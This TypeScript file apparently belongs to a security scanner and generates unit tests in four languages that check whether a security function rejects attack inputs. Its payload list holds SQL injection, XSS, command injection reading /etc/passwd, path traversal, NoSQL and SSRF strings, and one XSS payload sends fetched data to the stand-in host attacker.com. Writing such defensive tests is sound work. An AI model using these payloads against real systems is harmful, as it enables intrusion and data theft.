import * as fs from 'fs';
import * as path from 'path';
import { SupportedLanguage, Vulnerability } from '../interfaces';

export interface TestCase {
  name: string;
  input: string;
  expectedResult: string;
  description: string;
}

export class TestGenerator {
  // Test payloads for different vulnerability types
  private testPayloads: Record<string, string[]> = {
    'sql': [
      "' OR 1=1 --",
      "'; DROP TABLE users; --",
      "' UNION SELECT username, password FROM users --"
    ],
    'xss': [
      "<script>alert('XSS')</script>",
      "<img src='x' onerror='alert(1)'>",
      "<svg onload='fetch(\"/api/sensitive\").then(r=>r.text()).then(t=>fetch(\"https://attacker.com/\"+t))'>",
    ],
    'command': [
      "; cat /etc/passwd",
      "$(cat /etc/passwd)",
      "|| cat /etc/passwd"
    ],
    'path': [
      "../../../etc/passwd",
      "..\\..\\..\\Windows\\system.ini",
      "/etc/passwd",
      "C:\\Windows\\system.ini"
    ],
    'nosql': [
      '{"$gt": ""}',
      '{"$where": "function() { return true; }"}',
      '{"$ne": null}'
    ],
    'ssrf': [
      "http://localhost:8080/admin",
      "http://169.254.169.254/latest/meta-data/",
      "file:///etc/passwd"
    ]
  };
  
  // Mapping between rule IDs and vulnerability types
  private ruleTypeMap: Record<string, string> = {
    'js-sqli-001': 'sql',
    'py-sqli-001': 'sql',
    'java-sqli-001': 'sql',
    'cs-sqli-001': 'sql',
    'js-xss-001': 'xss',
    'py-xss-001': 'xss',
    'java-xss-001': 'xss',
    'cs-xss-001': 'xss',
    'js-cmd-001': 'command',
    'py-cmd-001': 'command',
    'java-cmd-001': 'command',
    'cs-cmd-001': 'command',
    'js-path-001': 'path',
    'py-path-001': 'path',
    'java-path-001': 'path',
    'cs-path-001': 'path',
    'dynamic-cmd-001': 'command',
    'dynamic-path-001': 'path',
    'dynamic-ssrf-001': 'ssrf',
    'dynamic-crypto-001': 'crypto',
    'taint-sql-001': 'sql',
    'taint-xss-001': 'xss',
    'taint-command-001': 'command',
    'taint-path-001': 'path',
    'taint-eval-001': 'eval'
  };
  
  /**
   * Generate test cases for verifying vulnerabilities
   */
  public generateTests(code: string, language: SupportedLanguage, vulnerabilities: Vulnerability[]): TestCase[] {
    const testCases: TestCase[] = [];
    
    // Process each vulnerability
    for (const vulnerability of vulnerabilities) {
      const type = this.getVulnerabilityType(vulnerability.ruleId);
      
      if (type && this.testPayloads[type]) {
        // Create test cases with each payload
        for (const payload of this.testPayloads[type]) {
          testCases.push({
            name: `Test ${vulnerability.ruleId} with payload: ${payload.substring(0, 20)}`,
            input: payload,
            expectedResult: 'Attack should be blocked',
            description: `Validate vulnerability: ${vulnerability.message}`
          });
        }
      }
    }
    
    // Write test cases to file if possible
    this.writeTestCases(testCases, language);
    
    return testCases;
  }
  
  /**
   * Get vulnerability type from rule ID
   */
  private getVulnerabilityType(ruleId: string): string | undefined {
    const exactMatch = this.ruleTypeMap[ruleId];
    if (exactMatch) return exactMatch;
    
    // Try to match by partial rule ID
    for (const [rulePattern, type] of Object.entries(this.ruleTypeMap)) {
      if (ruleId.includes(rulePattern.split('-')[1])) {
        return type;
      }
    }
    
    return undefined;
  }
  
  /**
   * Generate language-appropriate test file
   */
  private writeTestCases(testCases: TestCase[], language: SupportedLanguage): void {
    if (testCases.length === 0) return;
    
    try {
      // Create test output directory if it doesn't exist
      const testDir = path.join(process.cwd(), 'security-tests');
      if (!fs.existsSync(testDir)) {
        fs.mkdirSync(testDir, { recursive: true });
      }
      
      // Generate language-appropriate test script
      switch (language) {
        case 'javascript':
          this.writeJavaScriptTests(testCases, testDir);
          break;
        case 'python':
          this.writePythonTests(testCases, testDir);
          break;
        case 'java':
          this.writeJavaTests(testCases, testDir);
          break;
        case 'csharp':
          this.writeCSharpTests(testCases, testDir);
          break;
      }
    } catch (error) {
      console.error('Error writing test cases:', error);
    }
  }
  
  /**
   * Write JavaScript test cases using Jest
   */
  private writeJavaScriptTests(testCases: TestCase[], testDir: string): void {
    const testFile = path.join(testDir, 'security.test.js');
    
    let testContent = `// Auto-generated security tests
const { securityCheck } = require('../src/security');

describe('Security vulnerability tests', () => {
`;
    
    for (const test of testCases) {
      testContent += `
  test('${test.name.replace(/'/g, "\\'")}', () => {
    // ${test.description}
    const input = \`${test.input.replace(/`/g, '\\`')}\`;
    
    // Assert that security check rejects the malicious input
    expect(() => securityCheck(input)).toThrow();
  });
`;
    }
    
    testContent += '});\n';
    
    fs.writeFileSync(testFile, testContent);
  }
  
  /**
   * Write Python test cases using unittest
   */
  private writePythonTests(testCases: TestCase[], testDir: string): void {
    const testFile = path.join(testDir, 'test_security.py');
    
    let testContent = `# Auto-generated security tests
import unittest
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from src.security import security_check

class SecurityTests(unittest.TestCase):
`;
    
    for (let i = 0; i < testCases.length; i++) {
      const test = testCases[i];
      testContent += `
    def test_${i + 1}_${test.name.replace(/[^a-zA-Z0-9]/g, '_').toLowerCase()}(self):
        """${test.description}"""
        input_value = """${test.input.replace(/"/g, '\\"')}"""
        
        # Assert that security check raises an exception for malicious input
        with self.assertRaises(Exception):
            security_check(input_value)
`;
    }
    
    testContent += `
if __name__ == '__main__':
    unittest.main()
`;
    
    fs.writeFileSync(testFile, testContent);
  }
  
  /**
   * Write Java test cases using JUnit
   */
  private writeJavaTests(testCases: TestCase[], testDir: string): void {
    const testFile = path.join(testDir, 'SecurityTest.java');
    
    let testContent = `// Auto-generated security tests
import org.junit.jupiter.api.Test;
import static org.junit.jupiter.api.Assertions.*;

import com.example.security.SecurityChecker;

public class SecurityTest {
    private SecurityChecker securityChecker = new SecurityChecker();
`;
    
    for (let i = 0; i < testCases.length; i++) {
      const test = testCases[i];
      testContent += `
    @Test
    public void test${i + 1}${test.name.replace(/[^a-zA-Z0-9]/g, '')}() {
        // ${test.description}
        String input = "${test.input.replace(/"/g, '\\"')}";
        
        // Assert that security check throws an exception for malicious input
        assertThrows(SecurityException.class, () -> {
            securityChecker.check(input);
        });
    }
`;
    }
    
    testContent += '}\n';
    
    fs.writeFileSync(testFile, testContent);
  }
  
  /**
   * Write C# test cases using NUnit
   */
  private writeCSharpTests(testCases: TestCase[], testDir: string): void {
    const testFile = path.join(testDir, 'SecurityTests.cs');
    
    let testContent = `// Auto-generated security tests
using NUnit.Framework;
using System;
using SecurityLib;

namespace SecurityTests
{
    [TestFixture]
    public class SecurityTests
    {
        private SecurityChecker _securityChecker = new SecurityChecker();
`;
    
    for (let i = 0; i < testCases.length; i++) {
      const test = testCases[i];
      testContent += `
        [Test]
        public void Test${i + 1}_${test.name.replace(/[^a-zA-Z0-9]/g, '')}()
        {
            // ${test.description}
            string input = @"${test.input.replace(/"/g, '\\"')}";
            
            // Assert that security check throws an exception for malicious input
            Assert.Throws<SecurityException>(() => _securityChecker.Check(input));
        }
`;
    }
    
    testContent += '    }\n}\n';
    
    fs.writeFileSync(testFile, testContent);
  }
} 